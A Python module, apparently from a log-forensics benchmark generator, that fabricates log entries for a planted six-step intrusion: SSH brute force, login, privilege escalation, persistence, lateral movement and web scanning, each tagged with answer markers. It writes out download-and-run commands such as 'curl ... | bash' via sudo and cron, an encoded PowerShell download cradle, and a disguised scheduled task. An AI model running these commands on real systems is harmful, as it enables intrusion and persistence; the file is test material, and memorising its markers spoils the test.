"""The planted six-step attack. Returns Entries tagged with step + marker."""
from __future__ import annotations

import base64
import random
from datetime import datetime, timedelta

from .formats import Entry, auth, nginx, win

DAY = datetime(2026, 10, 27)
ATTACKER, PIVOT = "203.0.113.45", "10.0.0.5"
VICTIM, NEW_USER = "deploy", "svc_backup"
PAYLOAD = f"http://{ATTACKER}:8080"

STEPS = {
    1: ("brute_force", "SSH password brute force against web01 from the attacker IP, "
        "mixing invalid usernames, root and the valid user deploy."),
    2: ("initial_access", "Attacker logs in over SSH as deploy after the last failure."),
    3: ("privilege_escalation", "deploy runs sudo to pipe a remote script from the attacker host into bash."),
    4: ("persistence", "Root shell creates local user svc_backup and a cron job that re-fetches the payload."),
    5: ("lateral_movement", "From web01 (10.0.0.5) svc_backup is used against ws-fin01: failed logons, "
        "network logon, special privileges, encoded PowerShell, scheduled task WindowsUpdateCheck."),
    6: ("web_recon", "Attacker IP scans nginx on web01 for admin panels and leaked files."),
}
INVALID_USERS = ["admin", "test", "oracle", "ubuntu", "postgres", "guest", "user", "support"]
SCAN_PATHS = ["/wp-admin/", "/wp-login.php", "/.env", "/phpmyadmin/", "/admin", "/.git/config",
              "/backup.zip", "/config.php", "/server-status", "/xmlrpc.php", "/administrator/",
              "/phpinfo.php", "/.htaccess", "/db.sql", "/api/v1/users", "/console", "/manager/html",
              "/cgi-bin/test.cgi", "/old/", "/.svn/entries", "/login", "/robots.txt", "/",
              "/wp-content/debug.log", "/admin/login", "/actuator/env", "/.aws/credentials",
              "/test.php", "/shell.php", "/vendor/phpunit/", "/owa/", "/solr/admin/"]
SCAN_STATUS = {"/admin": 403, "/.git/config": 403, "/server-status": 403, "/robots.txt": 200,
               "/login": 200, "/": 200}
SCAN_UA = "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"


def build(rng: random.Random, hard: bool, skew: int) -> list[Entry]:
    gap = timedelta(minutes=3 if hard else 10)
    out: list[Entry] = []
    used: set[int] = set()

    def pid() -> int:  # attack pids live in 5000+, noise pids below, so markers never collide
        while (p := rng.randint(5000, 32000)) in used:
            pass
        used.add(p)
        return p

    # 1 brute force
    n, span = rng.randint(25, 40), rng.uniform(180, 300)
    t = DAY + timedelta(hours=2, minutes=10, seconds=rng.randint(0, 59))
    offs = sorted(rng.uniform(0, span) for _ in range(n))
    ports = rng.sample(range(40000, 65000), n + 1)
    for i, (o, port) in enumerate(zip(offs, ports)):
        r = rng.random()
        if i == n - 1 or (0 < i and r < 0.25):
            who = VICTIM
        elif i == 0 or r < 0.85:
            who = f"invalid user {rng.choice(INVALID_USERS)}"
        else:
            who = "root"
        out.append(auth(t + timedelta(seconds=o), f"sshd[{pid()}]",
                        f"Failed password for {who} from {ATTACKER} port {port} ssh2",
                        step=1, marker=f"port {port} ssh2"))
    t1_end = t + timedelta(seconds=span)

    # 2 initial access
    t2 = t1_end + timedelta(seconds=rng.randint(20, 60))
    sp, lport = pid(), ports[n]
    out.append(auth(t2, f"sshd[{sp}]", f"Accepted password for {VICTIM} from {ATTACKER} port {lport} ssh2",
                    step=2, marker=f"Accepted password for {VICTIM} from {ATTACKER} port {lport}"))
    out.append(auth(t2, f"sshd[{sp}]",
                    f"pam_unix(sshd:session): session opened for user {VICTIM}(uid=1001) by (uid=0)"))

    # 3 privilege escalation
    t3 = t2 + gap
    cmd = f"curl -s {PAYLOAD}/x.sh | bash"
    out.append(auth(t3, "sudo", f"{VICTIM} : TTY=pts/0 ; PWD=/home/{VICTIM} ; USER=root ; "
                    f"COMMAND=/bin/bash -c '{cmd}'", step=3, marker=cmd))
    out.append(auth(t3, "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {VICTIM}(uid=1001)"))

    # 4 persistence: useradd + cron runs (the root shell from step 3 needs no sudo line)
    t4 = t3 + gap
    out.append(auth(t4 + timedelta(seconds=5), f"useradd[{pid()}]",
                    f"new user: name={NEW_USER}, UID=1002, GID=1002, home=/home/{NEW_USER}, shell=/bin/bash",
                    step=4, marker=f"new user: name={NEW_USER}",
                    missing=f"useradd log line creating {NEW_USER} (never logged / removed)" if hard else None))
    run = t4 + timedelta(minutes=2)
    for _ in range(4):
        p = pid()
        pre = f"pam_unix(cron:session): session opened for user {NEW_USER}(uid=1002) by (uid=0)"
        out.append(auth(run, f"CRON[{p}]", pre, step=4, marker=f"CRON[{p}]: pam_unix(cron:session): session opened"))
        out.append(auth(run, f"CRON[{p}]", f"({NEW_USER}) CMD (curl -s {PAYLOAD}/b.sh | bash)",
                        step=4, marker=f"CRON[{p}]: ({NEW_USER}) CMD"))
        out.append(auth(run, f"CRON[{p}]", f"pam_unix(cron:session): session closed for user {NEW_USER}"))
        last_run, run = run, run + timedelta(minutes=5)

    # 5 lateral movement on ws-fin01
    t5 = last_run + gap
    for _ in range(rng.randint(3, 5)):
        t5 += timedelta(seconds=rng.randint(4, 12))
        out.append(win(t5, skew, 4625, {"TargetUserName": NEW_USER, "LogonType": "3", "IpAddress": PIVOT,
                                        "Status": "0xC000006D"}, step=5))
    t5 += timedelta(seconds=rng.randint(5, 15))
    out.append(win(t5, skew, 4624, {"TargetUserName": NEW_USER, "LogonType": "3", "IpAddress": PIVOT,
                                    "WorkstationName": "web01"}, step=5))
    out.append(win(t5 + timedelta(milliseconds=3), skew, 4672,
                   {"SubjectUserName": NEW_USER, "PrivilegeList": "SeDebugPrivilege SeBackupPrivilege"}, step=5))
    t5 += timedelta(seconds=rng.randint(20, 60))
    enc = base64.b64encode(f"IEX (New-Object Net.WebClient).DownloadString('{PAYLOAD}/w.ps1')"
                           .encode("utf-16-le")).decode()
    out.append(win(t5, skew, 4688, {
        "SubjectUserName": NEW_USER, "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": f"powershell.exe -NoP -W Hidden -Enc {enc}", "ParentProcessName": r"C:\Windows\System32\cmd.exe"},
        step=5))
    t5 += timedelta(seconds=rng.randint(20, 60))
    out.append(win(t5, skew, 4698, {
        "SubjectUserName": NEW_USER, "TaskName": r"\WindowsUpdateCheck",
        "TaskContent": f"powershell.exe -NoP -W Hidden -c \"iwr {PAYLOAD}/w.ps1 | iex\""}, step=5))

    # 6 web recon
    t6 = t5 + gap
    ts = t6
    for path in rng.sample(SCAN_PATHS, 26):
        ts += timedelta(seconds=rng.uniform(0.5, 6))
        out.append(nginx(ts, ATTACKER, "GET", path, SCAN_STATUS.get(path, 404),
                         rng.choice([162, 196, 548]), "-", SCAN_UA, step=6))
    out.append(auth(ts + timedelta(seconds=60), f"sshd[{sp}]",
                    f"pam_unix(sshd:session): session closed for user {VICTIM}"))
    return out
